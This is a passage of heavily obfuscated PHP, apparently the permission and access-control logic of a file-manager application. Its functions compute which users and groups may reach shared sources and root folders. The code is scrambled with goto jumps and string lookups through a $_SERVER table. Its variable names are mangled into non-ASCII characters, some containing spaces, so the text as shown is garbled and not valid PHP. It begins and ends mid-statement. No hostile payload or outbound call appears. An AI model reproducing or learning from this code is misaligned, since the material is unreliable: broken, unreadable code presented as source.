count(explode($béâôºº©ï[8], trim($c¯ï¬Åßø[$béâôºº©ï[513]], $béâôºº©ï[8]))); $F‹ÙğÂ…ÃÅ[] = $E„¡²‰Ò•Æ + ($c¯ï¬Åßø[$béâôºº©ï[29]] == $béâôºº©ï[77] ? 0 : 1000); goto DÀ…ÊÇ˜Ïµ; eºÕôïÌ‰Ò: $c¯ï¬Åßø[$béâôºº©ï[1893]] = $this->authTargetInfo($eŒßùˆºÇæ); $c¯ï¬Åßø[$béâôºº©ï[513]] = rtrim($c¯ï¬Åßø[$béâôºº©ï[519]], $béâôºº©ï[8]) . $béâôºº©ï[8] . ltrim($c¯ï¬Åßø[$béâôºº©ï[513]], $béâôºº©ï[8]); $aŠ·ÅàÒØ‘[] = $c¯ï¬Åßø; goto A£âÓŒ¾Í; F¸¤Õåò™ö: unset($c¯ï¬Åßø[$béâôºº©ï[85]]); $eŒßùˆºÇæ = $d½éâî§Ó[$c¯ï¬Åßø[$béâôºº©ï[397]]]; if (!$eŒßùˆºÇæ) { continue; } goto eºÕôïÌ‰Ò; DÀ…ÊÇ˜Ïµ: } goto eÓÆÄ«¡ÃÁ; dâ”ïèã: $béâôºº©ï =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $BÕšà„‰áÑ = Model($béâôºº©ï[1227])->sourceListInfo($föôğªŒ, !0); $d½éâî§Ó = $this->sourceAuthSelect($föôğªŒ); goto a‘¬ƒò­†„; fœ°ÀÇ«·®: } private function groupChidldAllRootSource($Aã¿Ë‚ÛîÈ) { $cßŞÈÃ ¥à =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fÍªïÙ„˜È = Model($cßŞÈÃ ¥à[1894])->groupChildrenAll($Aã¿Ë‚ÛîÈ); $F¦ÖÚ§¸É = array($cßŞÈÃ ¥à[492] => 0, $cßŞÈÃ ¥à[498] => array($cßŞÈÃ ¥à[7], $fÍªïÙ„˜È), $cßŞÈÃ ¥à[406] => SourceModel::TYPE_GROUP); $DË°§öƒá’ = Model($cßŞÈÃ ¥à[813])->field($cßŞÈÃ ¥à[397])->where($F¦ÖÚ§¸É)->select(); $DË°§öƒá’ = array_to_keyvalue($DË°§öƒá’, $cßŞÈÃ ¥à[33], $cßŞÈÃ ¥à[397]); return $DË°§öƒá’; } private function authTargetInfo($AÃÛå”ø‘Ğ) { goto cÊêƒì¶ÙĞ; cÊêƒì¶ÙĞ: $cÃŒĞ¹¦§Á =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bâÌ„ÇğÓÛ = array(); $CŸßùÒ¿˜Å = array(); goto c±ƒœ´‹§; c±ƒœ´‹§: $fªÉÏ”È­ = 2 << 25; foreach ($AÃÛå”ø‘Ğ as $fÍ²·È…ÒÃ) { goto aŸõºö‰®â; cáÚÊ®ÖË‡: $bŠƒ­Š³­¤ = 0; if ($fÍ²·È…ÒÃ[$cÃŒĞ¹¦§Á[406]] == SourceModel::TYPE_GROUP) { $bŠƒ­Š³­¤ = $fªÉÏ”È­ * 2; } if ($fÍ²·È…ÒÃ[$cÃŒĞ¹¦§Á[406]] == SourceModel::TYPE_USER) { $bŠƒ­Š³­¤ = $fªÉÏ”È­; } goto cóäâˆÛŸº; aŸõºö‰®â: $eÀ×³ï‹èÒ = Model($cÃŒĞ¹¦§Á[501])->listData($fÍ²·È…ÒÃ[$cÃŒĞ¹¦§Á[1819]]); if (!$eÀ×³ï‹èÒ) { continue; } if ($fÍ²·È…ÒÃ[$cÃŒĞ¹¦§Á[406]] == SourceModel::TYPE_USER) { $c¨£”¶‡Ö = Model($cÃŒĞ¹¦§Á[507])->getInfoSimpleOuter($fÍ²·È…ÒÃ[$cÃŒĞ¹¦§Á[498]]); if ($c¨£”¶‡Ö[$cÃŒĞ¹¦§Á[1550]] == $cÃŒĞ¹¦§Á[1106]) { continue; } if ($c¨£”¶‡Ö[$cÃŒĞ¹¦§Á[1550]] == $cÃŒĞ¹¦§Á[191]) { $c¨£”¶‡Ö[$cÃŒĞ¹¦§Á[28]] = LNG($cÃŒĞ¹¦§Á[1895]); } } else { $c¨£”¶‡Ö = Model($cÃŒĞ¹¦§Á[516])->getInfoSimple($fÍ²·È…ÒÃ[$cÃŒĞ¹¦§Á[498]]); } goto aÕĞ“ÚŒøÍ; aÕĞ“ÚŒøÍ: if (!$c¨£”¶‡Ö) { continue; } $c¨£”¶‡Ö[$cÃŒĞ¹¦§Á[460]] = $eÀ×³ï‹èÒ; $bâÌ„ÇğÓÛ[] = $c¨£”¶‡Ö; goto cáÚÊ®ÖË‡; cóäâˆÛŸº: if ($fÍ²·È…ÒÃ[$cÃŒĞ¹¦§Á[406]] == SourceModel::TYPE_USER && $fÍ²·È…ÒÃ[$cÃŒĞ¹¦§Á[498]] == $cÃŒĞ¹¦§Á[191]) { $bŠƒ­Š³­¤ = 0; } $CŸßùÒ¿˜Å[] = $eÀ×³ï‹èÒ[$cÃŒĞ¹¦§Á[408]] + $bŠƒ­Š³­¤; goto eËÛÁ¡°á; eËÛÁ¡°á: } array_multisort($CŸßùÒ¿˜Å, SORT_DESC, $bâÌ„ÇğÓÛ); goto aÀÀ‡î°; aÀÀ‡î°: return $bâÌ„ÇğÓÛ; goto F˜‡íğ¡Š‡; F˜‡íğ¡Š‡: } public function getAllChildrenByUser($Aò™ ¼çÎÕ, $AÊ‰àóŸñ) { goto B—ßßòÛà³; c¾³ôŠôò„: if ($Eœìˆ‚ ±±[$Aİ„í‰ˆÔĞ[492]] == $Aİ„í‰ˆÔĞ[191] && $Eœìˆ‚ ±±[$Aİ„í‰ˆÔĞ[498]] != $Fâ†÷Â‡­ && $this->groupContainUser($Eœìˆ‚ ±±[$Aİ„í‰ˆÔĞ[498]], $AÊ‰àóŸñ)) { foreach ($AÎâÍÚ‰çï[$Aİ„í‰ˆÔĞ[1896]] as $c…ñªÀÅÙ) { $B¯àáİÆ”Î = Model($Aİ„í‰ˆÔĞ[516])->getInfo($c…ñªÀÅÙ[$Aİ„í‰ˆÔĞ[1719]]); $FÊ¯•ÌçÖà = Model($Aİ„í‰ˆÔĞ[532])->getInfoSimpleOuter($AÊ‰àóŸñ); $FÊ¯•ÌçÖà[$Aİ„í‰ˆÔĞ[460]] = $c…ñªÀÅÙ[$Aİ„í‰ˆÔĞ[408]]; if (Model($Aİ„í‰ˆÔĞ[501])->authCheckAction($c…ñªÀÅÙ[$Aİ„í‰ˆÔĞ[408]][$Aİ„í‰ˆÔĞ[408]], $Aİ„í‰ˆÔĞ[1739])) { continue; } $D³‹œÍäÀŸ = array($Aİ„í‰ˆÔĞ[28] => $Aİ„í‰ˆÔĞ[1502] . $B¯àáİÆ”Î[$Aİ„í‰ˆÔĞ[28]], $Aİ„í‰ˆÔĞ[397] => $B¯àáİÆ”Î[$Aİ„í‰ˆÔĞ[85]][$Aİ„í‰ˆÔĞ[397]], $Aİ„í‰ˆÔĞ[76] => KodIO::make($B¯àáİÆ”Î[$Aİ„í‰ˆÔĞ[85]][$Aİ„í‰ˆÔĞ[397]]), $Aİ„í‰ˆÔĞ[492] => $Aİ„í‰ˆÔĞ[191], $Aİ„í‰ˆÔĞ[406] => $Aİ„í‰ˆÔĞ[509], $Aİ„í‰ˆÔĞ[29] => $Aİ„í‰ˆÔĞ[542], $Aİ„í‰ˆÔĞ[513] => $B¯àáİÆ”Î[$Aİ„í‰ˆÔĞ[520]], $Aİ„í‰ˆÔĞ[1719] => $B¯àáİÆ”Î[$Aİ„í‰ˆÔĞ[1719]], $Aİ„í‰ˆÔĞ[517] => $B¯àáİÆ”Î[$Aİ„í‰ˆÔĞ[492]], $Aİ„í‰ˆÔĞ[1893] => array($FÊ¯•ÌçÖà)); $b‚ÕÍá“áÉ[$D³‹œÍäÀŸ[$Aİ„í‰ˆÔĞ[397]]] = $D³‹œÍäÀŸ; } } $bÅÀ­ƒ‚´¥ = array(); $fšæ»™†İÌ = $this->getAllChildren($Aò™ ¼çÎÕ); goto Fª²½¸´Şæ; Fª²½¸´Şæ: foreach ($fšæ»™†İÌ as $cÀ†­Ñ›øõ) { $F¼Ä«¾Õ¥ = !1; foreach ($cÀ†­Ñ›øõ[$Aİ„í‰ˆÔĞ[1893]] as $c§¯Œİ“Ñá) { if ($c§¯Œİ“Ñá[$Aİ„í‰ˆÔĞ[1550]]) { if ($c§¯Œİ“Ñá[$Aİ„í‰ˆÔĞ[1550]] == $AÊ‰àóŸñ) { $F¼Ä«¾Õ¥ = !0; break; } } if ($c§¯Œİ“Ñá[$Aİ„í‰ˆÔĞ[1719]]) { if ($this->groupContainUser($c§¯Œİ“Ñá[$Aİ„í‰ˆÔĞ[1719]], $AÊ‰àóŸñ)) { $F¼Ä«¾Õ¥ = !0; break; } } } if ($F¼Ä«¾Õ¥) { $bÅÀ­ƒ‚´¥[] = $cÀ†­Ñ›øõ; } $f¡Ô§†šõ = $cÀ†­Ñ›øõ[$Aİ„í‰ˆÔĞ[397]]; if (isset($b‚ÕÍá“áÉ[$f¡Ô§†šõ])) { $cÀ†­Ñ›øõ[$Aİ„í‰ˆÔĞ[1893]][] = $b‚ÕÍá“áÉ[$f¡Ô§†šõ][0]; $b‚ÕÍá“áÉ[$f¡Ô§†šõ] = !1; } } $b‚ÕÍá“áÉ = array_filter(array_values($b‚ÕÍá“áÉ)); $bÅÀ­ƒ‚´¥ = array_merge($b‚ÕÍá“áÉ, $bÅÀ­ƒ‚´¥); goto aÎ–·Š‚†§; B—ßßòÛà³: $Aİ„í‰ˆÔĞ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $AÎâÍÚ‰çï = Model($Aİ„í‰ˆÔĞ[532])->getInfo($AÊ‰àóŸñ); if (!$AÊ‰àóŸñ || !$Aò™ ¼çÎÕ || !$AÎâÍÚ‰çï) { return array(); } goto dàÑŒ¶ÚÅµ; aÎ–·Š‚†§: return $bÅÀ­ƒ‚´¥; goto Aº‘Ò•ˆóÀ; dàÑŒ¶ÚÅµ: $Eœìˆ‚ ±± = Model($Aİ„í‰ˆÔĞ[1227])->sourceInfo($Aò™ ¼çÎÕ); $b‚ÕÍá“áÉ = array(); $Fâ†÷Â‡­ = 1; goto c¾³ôŠôò„; Aº‘Ò•ˆóÀ: } public function setAllChildrenByUser($f¾Ÿ™«êò, $DÃé…µŠìè, $Eƒ¼×é·Üé) { $D÷ëÛÒ¥é” =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A´êÆ‚Üãù = $this->getAllChildrenByUser($f¾Ÿ™«êò, $DÃé…µŠìè); if (!$Eƒ¼×é·Üé || !$A´êÆ‚Üãù) { return !1; } foreach ($A´êÆ‚Üãù as $eÓ–ŠŒŠÂ‚) { $C†óó¿‘æŠ = array(); foreach ($eÓ–ŠŒŠÂ‚[$D÷ëÛÒ¥é”[1893]] as $dÕ°ƒ“ù‚Œ) { $bÔÛ–Öåç‘ = $dÕ°ƒ“ù‚Œ[$D÷ëÛÒ¥é”[460]]; $eÊˆª¡ãĞ÷ = $dÕ°ƒ“ù‚Œ[$D÷ëÛÒ¥é”[1550]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $EÙ¨öÀêµ = $dÕ°ƒ“ù‚Œ[$D÷ëÛÒ¥é”[1550]] ? $dÕ°ƒ“ù‚Œ[$D÷ëÛÒ¥é”[1550]] : $dÕ°ƒ“ù‚Œ[$D÷ëÛÒ¥é”[1719]]; if ($dÕ°ƒ“ù‚Œ[$D÷ëÛÒ¥é”[1550]] && $dÕ°ƒ“ù‚Œ[$D÷ëÛÒ¥é”[1550]] == $DÃé…µŠìè) { continue; } $C†óó¿‘æŠ[] = array($D÷ëÛÒ¥é”[397] => $eÓ–ŠŒŠÂ‚[$D÷ëÛÒ¥é”[397]], $D÷ëÛÒ¥é”[406] => $eÊˆª¡ãĞ÷, $D÷ëÛÒ¥é”[498] => intval($EÙ¨öÀêµ), $D÷ëÛÒ¥é”[1819] => isset($bÔÛ–Öåç‘[$D÷ëÛÒ¥é”[395]]) ? intval($bÔÛ–Öåç‘[$D÷ëÛÒ¥é”[395]]) : 0, $D÷ëÛÒ¥é”[1873] => isset($bÔÛ–Öåç‘[$D÷ëÛÒ¥é”[1873]]) ? intval($bÔÛ–Öåç‘[$D÷ëÛÒ¥é”[1873]]) : -1); } $C†óó¿‘æŠ[] = array($D÷ëÛÒ¥é”[397] => $eÓ–ŠŒŠÂ‚[$D÷ëÛÒ¥é”[397]], $D÷ëÛÒ¥é”[406] => SourceModel::TYPE_USER, $D÷ëÛÒ¥é”[498] => intval($DÃé…µŠìè), $D÷ëÛÒ¥é”[1819] => intval($Eƒ¼×é·Üé), $D÷ëÛÒ¥é”[1873] => -1); $this->where(array($D÷ëÛÒ¥é”[412] => $eÓ–ŠŒŠÂ‚[$D÷ëÛÒ¥é”[397]]))->delete(); $this->addAll($C†óó¿‘æŠ); } return !0; } public function get($bŠšŞÅÇÛ) { $A­Ğ­Ô‚Ÿƒ = $this->getSourceList(array($bŠšŞÅÇÛ), !0); return $A­Ğ­Ô‚Ÿƒ[0]; } public function getSourceList($fÛÍÃª‹, $dÏá§¯í¢ = false, $aÄÈØğ™¿  = false) { goto cÙ¹Õª±‹‹; eß³‘ñÇ«“: $BœŠÓ½´Á¥ = array(); foreach ($dÏá§¯í¢ as $d‹—¹ÚğÎ => $d÷ğ„¦ÀÆ) { if ($Dœ³ò±Ó¬) { $BœŠÓ½´Á¥[$d‹—¹ÚğÎ] = $E®ƒâİ¥„ò; continue; } $BœŠÓ½´Á¥[$d‹—¹ÚğÎ] = $this->makeSourceAuth($d÷ğ„¦ÀÆ, $fËëˆÈİª©, $aÄÈØğ™¿ ); } return $BœŠÓ½´Á¥; goto eáÖƒêééË; F›‡Š¾¾ ·: $a¹¡Í¡á¾‹ = $this->sourceAuthSelect($F¤¬ƒöæ); $fËëˆÈİª© = array(); foreach ($F¤¬ƒöæ as $d‹—¹ÚğÎ) { if (isset($a¹¡Í¡á¾‹[$d‹—¹ÚğÎ])) { $fËëˆÈİª©[$d‹—¹ÚğÎ] = $a¹¡Í¡á¾‹[$d‹—¹ÚğÎ]; } } goto fÌÒ‘ë¨îÉ; fÌÒ‘ë¨îÉ: $Dœ³ò±Ó¬ = $this->userIsRoot($aÄÈØğ™¿ ); $dÊÆÕòê‹… = AuthModel::authAll(); $E®ƒâİ¥„ò = array($aòÑ¤Ò¾æ[409] => $dÊÆÕòê‹…, $aòÑ¤Ò¾æ[1898] => array($aòÑ¤Ò¾æ[414] => 0, $aòÑ¤Ò¾æ[1725] => $dÊÆÕòê‹…, $aòÑ¤Ò¾æ[415] => LNG($aòÑ¤Ò¾æ[1899]), $aòÑ¤Ò¾æ[1741] => $aòÑ¤Ò¾æ[1900])); goto eß³‘ñÇ«“; AÔ×æÑÂÈ«: if (!$dÏá§¯í¢ && count($fÛÍÃª‹) == 1) { $dÏá§¯í¢ = array(); $dÏá§¯í¢[$fÛÍÃª‹[0]] = $béÓò×¾‚->sourceInfo($fÛÍÃª‹[0]); } if (!$dÏá§¯í¢) { $e×¸ÑáˆŠ® = array($aòÑ¤Ò¾æ[412] => array($aòÑ¤Ò¾æ[413], $fÛÍÃª‹)); $dÏá§¯í¢ = $béÓò×¾‚->field($aòÑ¤Ò¾æ[1897])->where($e×¸ÑáˆŠ®)->select(); $dÏá§¯í¢ = array_to_keyvalue($dÏá§¯í¢, $aòÑ¤Ò¾æ[397]); } $F¤¬ƒöæ = $fÛÍÃª‹; goto C†õøÎŸ•; C†õøÎŸ•: foreach ($dÏá§¯í¢ as $b­´ïœõç => $Bà§‹‚¶Œ) { $B‘ß§ò¡ë¢ = $béÓò×¾‚->parentLevelArray($Bà§‹‚¶Œ[$aòÑ¤Ò¾æ[515]]); $F¤¬ƒöæ = array_merge($F¤¬ƒöæ, array($b­´ïœõç), array_reverse($B‘ß§ò¡ë¢)); } $F¤¬ƒöæ = array_values(array_unique($F¤¬ƒöæ)); if (!$F¤¬ƒöæ) { return array(); } goto F›‡Š¾¾ ·; cÙ¹Õª±‹‹: $aòÑ¤Ò¾æ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$fÛÍÃª‹) { return array(); } $béÓò×¾‚ = Model($aòÑ¤Ò¾æ[1227]); goto AÔ×æÑÂÈ«; eáÖƒêééË: } public function authDeepCheck($AÂÖ×å‹ª‰, $aˆ±íÈİÑ = false) { goto d‹Î ÚÊÉ®; d‹Î ÚÊÉ®: $fò÷ÒÈïâÜ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aˆ±íÈİÑ = $aˆ±íÈİÑ ? $aˆ±íÈİÑ : USER_ID; $cÓÍíÑ„Æ— = $this->makeAuthDeep($aˆ±íÈİÑ); goto bŸ›¿Ôî¹ ; ağÈ¹Ğ›¼†: if (!$BÕõøìÁâ) { return !1; } $f·Öï¬ÚÄ = $BÕõøìÁâ ? $BÕõøìÁâ[0] : $AÂÖ×å‹ª‰; return array($fò÷ÒÈïâÜ[409] => -1, $fò÷ÒÈïâÜ[460] => array($fò÷ÒÈïâÜ[414] => $fò÷ÒÈïâÜ[1106], $fò÷ÒÈïâÜ[1725] => $fò÷ÒÈïâÜ[191], $fò÷ÒÈïâÜ[415] => LNG($fò÷ÒÈïâÜ[1903]), $fò÷ÒÈïâÜ[1741] => $fò÷ÒÈïâÜ[1904]), $fò÷ÒÈïâÜ[1905] => LNG($fò÷ÒÈïâÜ[1906]), $fò÷ÒÈïâÜ[1907] => $this->sourceAuthInfo($f·Öï¬ÚÄ)); goto fĞÑÉ‹ã¶¾; bŸ›¿Ôî¹ : if (!in_array($AÂÖ×å‹ª‰, $cÓÍíÑ„Æ—[$fò÷ÒÈïâÜ[1901]])) { return !1; } $BÕõøìÁâ = array(); foreach ($cÓÍíÑ„Æ—[$fò÷ÒÈïâÜ[1902]] as $bÍ–à÷ŒóË => $Eâó½å‡¬Ì) { if (!in_array($AÂÖ×å‹ª‰, $Eâó½å‡¬Ì)) { continue; } $BÕõøìÁâ[] = $bÍ–à÷ŒóË; } goto ağÈ¹Ğ›¼†; fĞÑÉ‹ã¶¾: } protected function makeAuthDeep($Eêõ¤ñ‰ƒ¨ = false) { goto DĞôàˆ¾å»; cº”„’•Ì‡: $BéÈÓî•î‹ = $A§¥…™ùŒ„; foreach ($BéÈÓî•î‹ as $bÁ™«¢ÉãĞ) { $aï§Û¿ÏÊÄ = $D®î²¾”ò„->getInfo($bÁ™«¢ÉãĞ); $C¶¿ÉêŸõŞ = $DÆµ×…·è->parentLevelArray($aï§Û¿ÏÊÄ[$a›‰Š¡¯[515]]); $A§¥…™ùŒ„ = array_merge($A§¥…™ùŒ„, $C¶¿ÉêŸõŞ); } $A§¥…™ùŒ„ = array_values(array_unique($A§¥…™ùŒ„)); goto fÕ×÷íŒ†—; Dì„Ÿ¯‚¥•: if (isset($BÇô¢è¯«Í[$Eêõ¤ñ‰ƒ¨])) { return $BÇô¢è¯«Í[$Eêõ¤ñ‰ƒ¨]; } $E¬‰¹ÒÔÍ = Model($a›‰Š¡¯[1908])->listData(); $Cç×Î‰Ôƒ = array(); goto E½Ù¯ĞÍÖ; fÕ×÷íŒ†—: foreach ($A§¥…™ùŒ„ as $bÁ™«¢ÉãĞ) { $aï§Û¿ÏÊÄ = $D®î²¾”ò„->getInfo($bÁ™«¢ÉãĞ); $DÒ˜ãØøºõ[] = $aï§Û¿ÏÊÄ[$a›‰Š¡¯[85]][$a›‰Š¡¯[397]]; $dÈ¶åÊÅî³[$bÁ™«¢ÉãĞ] = $aï§Û¿ÏÊÄ[$a›‰Š¡¯[85]][$a›‰Š¡¯[397]]; $E£³ïŞ´‘[$bÁ™«¢ÉãĞ] = $DÆµ×…·è->parentLevelArray($aï§Û¿ÏÊÄ[$a›‰Š¡¯[515]]); } foreach ($cŠÄÁˆ‰¯£ as $FÍ±¾ó…Ü => $EÅêšÒÊ) { $F†Û¦ó’‚ = $cÎ†Œ»›ÙÄ[$FÍ±¾ó…Ü]; if (!$F†Û¦ó’‚ || !$dÈ¶åÊÅî³[$F†Û¦ó’‚]) { continue; } $a‹œéŞá… = array(); foreach ($E£³ïŞ´‘[$F†Û¦ó’‚] as $bÁ™«¢ÉãĞ) { $a‹œéŞá…[] = $dÈ¶åÊÅî³[$bÁ™«¢ÉãĞ]; } $cŠÄÁˆ‰¯£[$FÍ±¾ó…Ü] = array_merge($a‹œéŞá…, $EÅêšÒÊ); } $DÒ˜ãØøºõ = array_values(array_unique($DÒ˜ãØøºõ)); goto FÄÎ¿Ì—‘Ê; FÄÎ¿Ì—‘Ê: $AŒÀ¤¸– = array($a›‰Š¡¯[1901] => $DÒ˜ãØøºõ, $a›‰Š¡¯[1902] => $cŠÄÁˆ‰¯£); $BÇô¢è¯«Í[$Eêõ¤ñ‰ƒ¨] = $AŒÀ¤¸–; return $AŒÀ¤¸–; goto e±Íõšõ¿; bÎ’ãáæìè: if ($bÄ—‰é¹Íˆ) { $cï¶ÆÁó• = array(array($a›‰Š¡¯[406] => SourceModel::TYPE_USER, $a›‰Š¡¯[498] => $Eêõ¤ñ‰ƒ¨), array($a›‰Š¡¯[406] => SourceModel::TYPE_GROUP, $a›‰Š¡¯[498] => array($a›‰Š¡¯[413], $bÄ—‰é¹Íˆ)), $a›‰Š¡¯[980] => $a›‰Š¡¯[1811]); } $D“„¯Æ”—à = $this->field($a›‰Š¡¯[1909])->where($cï¶ÆÁó•)->select(); $BòÆšÕ‚’å = array(); goto C˜óÁ¤õ°; C˜óÁ¤õ°: $eß‚ˆß®êè = array_to_keyvalue_group($D“„¯Æ”—à, $a›‰Š¡¯[397]); foreach ($eß‚ˆß®êè as $e·ò¸­¹³ => $bÇÑšæ¤Í) { $B®¡¹‹‘ = $this->authArrayCheck($bÇÑšæ¤Í, $Eêõ¤ñ‰ƒ¨); if ($B®¡¹‹‘[$a›‰Š¡¯[409]] > 0) { $BòÆšÕ‚’å[] = $e·ò¸­¹³ . $a›‰Š¡¯[33]; } } $DÒ˜ãØøºõ = array(); goto Cç¦£ğå›‘; AºöòôÚÒŠ: $E£³ïŞ´‘ = array(); if ($BòÆšÕ‚’å) { $aŠŠ·ÁÊ¼ = $DÆµ×…·è->where(array($a›‰Š¡¯[397] => array($a›‰Š¡¯[413], $BòÆšÕ‚’å)))->select(); foreach ($aŠŠ·ÁÊ¼ as $D½ãÚ…¤¤») { $C¶¿ÉêŸõŞ = $DÆµ×…·è->parentLevelArray($D½ãÚ…¤¤»[$a›‰Š¡¯[515]]); $DÒ˜ãØøºõ = array_merge($DÒ˜ãØøºõ, $C¶¿ÉêŸõŞ); $A§¥…™ùŒ„[] = $D½ãÚ…¤¤»[$a›‰Š¡¯[498]]; $cŠÄÁˆ‰¯£[$D½ãÚ…¤¤»[$a›‰Š¡¯[397]]] = $C¶¿ÉêŸõŞ; $cÎ†Œ»›ÙÄ[$D½ãÚ…¤¤»[$a›‰Š¡¯[397]]] = $D½ãÚ…¤¤»[$a›‰Š¡¯[498]]; } } $A§¥…™ùŒ„ = array_values(array_unique($A§¥…™ùŒ„)); goto cº”„’•Ì‡; Cç¦£ğå›‘: $A§¥…™ùŒ„ = $bÄ—‰é¹Íˆ; $DÆµ×…·è = Model($a›‰Š¡¯[1227]); $D®î²¾”ò„ = Model($a›‰Š¡¯[516]); goto D‰‹Ë©½Š™; D‰‹Ë©½Š™: $cŠÄÁˆ‰¯£ = array(); $cÎ†Œ»›ÙÄ = array(); $dÈ¶åÊÅî³ = array(); goto AºöòôÚÒŠ; E½Ù¯ĞÍÖ: foreach ($E¬‰¹ÒÔÍ as $FôåõÜ•Ò”) { if ($FôåõÜ•Ò”[$a›‰Š¡¯[408]] == 0 && $FôåõÜ•Ò”[$a›‰Š¡¯[1740]] == $a›‰Š¡¯[87]) { $Cç×Î‰Ôƒ[] = $FôåõÜ•Ò”[$a›‰Š¡¯[395]]; } } $bÄ—‰é¹Íˆ = $this->userGroupParents($Eêõ¤ñ‰ƒ¨); $cï¶ÆÁó• = array($a›‰Š¡¯[406] => SourceModel::TYPE_USER, $a›‰Š¡¯[498] => $Eêõ¤ñ‰ƒ¨); goto bÎ’ãáæìè; DĞôàˆ¾å»: $a›‰Š¡¯ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; static $BÇô¢è¯«Í = array(); $Eêõ¤ñ‰ƒ¨ = $Eêõ¤ñ‰ƒ¨ ? $Eêõ¤ñ‰ƒ¨ : USER_ID; goto Dì„Ÿ¯‚¥•; e±Íõšõ¿: } private function makeSourceAuth($cÆõÔâåÈ³, $EÏ„÷éøÕ, $b´¨‡“Ø½× = false) { goto Bâ£§…ÜˆÆ; Cš«Ç±Èí¸: $b‚ã–…¯Ñ = Model($DôàªÖõ«é[1227])->parentLevelArray($cÆõÔâåÈ³[$DôàªÖõ«é[515]]); $b‚ã–…¯Ñ = array_merge(array($cÆõÔâåÈ³[$DôàªÖõ«é[397]]), array_reverse($b‚ã–…¯Ñ)); $cñÒ²§£·º = !1; goto B¨ƒÌÙ—Â; cˆœğ„Í: $AòÇ“ñ‹ = $cÆõÔâåÈ³[$DôàªÖõ«é[406]] == SourceModel::TYPE_GROUP; $C¦ÄƒŒ» Ã = $AòÇ“ñ‹ ? $this->groupRootAuth($côïöäô­á, $b´¨‡“Ø½×) : !1; if ($C¦ÄƒŒ» Ã && Model($DôàªÖõ«é[501])->authCheckAction($C¦ÄƒŒ» Ã[$DôàªÖõ«é[408]], $DôàªÖõ«é[1739])) { return $this->groupAuthInfo($C¦ÄƒŒ» Ã, $côïöäô­á); } goto Cš«Ç±Èí¸; B¨ƒÌÙ—Â: foreach ($b‚ã–…¯Ñ as $dâ„…îñ„¾) { if (!isset($EÏ„÷éøÕ[$dâ„…îñ„¾])) { continue; } $aäñƒîÊó³ = $this->authMake($EÏ„÷éøÕ[$dâ„…îñ„¾], $b´¨‡“Ø½×); if ($aäñƒîÊó³[$DôàªÖõ«é[460]]) { $cñÒ²§£·º = $aäñƒîÊó³; break; } } if (!$AòÇ“ñ‹) { return $cñÒ²§£·º; } if (!$cñÒ²§£·º && $C¦ÄƒŒ» Ã) { $cñÒ²§£·º = $this->groupAuthInfo($C¦ÄƒŒ» Ã, $côïöäô­á); } goto Eà’È¿°·; Bâ£§…ÜˆÆ: $DôàªÖõ«é =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $C½í»”Œ±³ = $DôàªÖõ«é[87]; $côïöäô­á = $cÆõÔâåÈ³[$DôàªÖõ«é[498]]; goto cˆœğ„Í; Eà’È¿°·: if (!$cñÒ²§£·º) { $cÉÒò×’£ = Model($DôàªÖõ«é[516])->getInfo($côïöäô­á); $eÆã‡ÏâÒ = explode($DôàªÖõ«é[47], trim($cÉÒò×’£[$DôàªÖõ«é[515]], $DôàªÖõ«é[47])); $eÆã‡ÏâÒ = array_reverse($eÆã‡ÏâÒ); foreach ($eÆã‡ÏâÒ as $BÙ½ìÈ¥È) { if ($BÙ½ìÈ¥È == $DôàªÖõ«é[191] || $BÙ½ìÈ¥È == $C½í»”Œ±³) { continue; } $BÅËâë£¬ˆ = $this->groupRootAuth($BÙ½ìÈ¥È, $b´¨‡“Ø½×); if (!$BÅËâë£¬ˆ) { continue; } $cñÒ²§£·º = $this->groupAuthInfo($BÅËâë£¬ˆ, $BÙ½ìÈ¥È); break; } } if (!$cñÒ²§£·º || $cñÒ²§£·º[$DôàªÖõ«é[409]] <= 0) { $dø„‹ˆù = $this->authDeepCheck($cÆõÔâåÈ³[$DôàªÖõ«é[397]], $b´¨‡“Ø½×); if ($dø„‹ˆù) { $cñÒ²§£·º = $dø„‹ˆù; } } return $cñÒ²§£·º; goto fĞêø¬¢½Š; fĞêø¬¢½Š: } private function userIsRoot($E¶©””¤“ = false) { $BÔÅêŒê =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$E¶©””¤“ && _get($GLOBALS, $BÔÅêŒê[499])) { return !0; } $bçœ×ˆÍã™ = Model($BÔÅêŒê[532])->getInfo($E¶©””¤“); $FøÊï½ó‹ = Model($BÔÅêŒê[1910])->listData($bçœ×ˆÍã™[$BÔÅêŒê[1431]]); if ($FøÊï½ó‹ && $FøÊï½ó‹[$BÔÅêŒê[505]][$BÔÅêŒê[1911]] == 1) { return !0; } return !1; } private function sourceAuthInfo($AÏõÖ¿ºòÜ) { goto AŞî®­‘öñ; eŒËä§ßë»: if (isset($F†Šó•†·[$Dšô‡Ë†Ì[521]])) { $f´âßïĞ¦ = explode($Dšô‡Ë†Ì[8], trim($F†Šó•†·[$Dšô‡Ë†Ì[513]], $Dšô‡Ë†Ì[8])); array_shift($f´âßïĞ¦); $E¢Ô½Ğ®‹İ = $F†Šó•†·[$Dšô‡Ë†Ì[519]] . $Dšô‡Ë†Ì[1912] . implode($Dšô‡Ë†Ì[8], $f´âßïĞ¦); } return array($Dšô‡Ë†Ì[415] => $F†Šó•†·[$Dšô‡Ë†Ì[28]], $Dšô‡Ë†Ì[76] => KodIO::make($F†Šó•†·[$Dšô‡Ë†Ì[397]]), $Dšô‡Ë†Ì[1913] => $E¢Ô½Ğ®‹İ); goto Fù‚ÓöÃëÒ; bâÔ„ùÁ: $cïæàØÛè¨ = $fÌ‹…ŠêÔ->_listAppendPath($cïæàØÛè¨); $F†Šó•†· = $cïæàØÛè¨[0]; $E¢Ô½Ğ®‹İ = $F†Šó•†·[$Dšô‡Ë†Ì[513]]; goto eŒËä§ßë»; AŞî®­‘öñ: $Dšô‡Ë†Ì =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fÌ‹…ŠêÔ = Model($Dšô‡Ë†Ì[1227]); $F†Šó•†· = $fÌ‹…ŠêÔ->sourceInfo($AÏõÖ¿ºòÜ); goto d–´‚‡Õ÷; d–´‚‡Õ÷: if 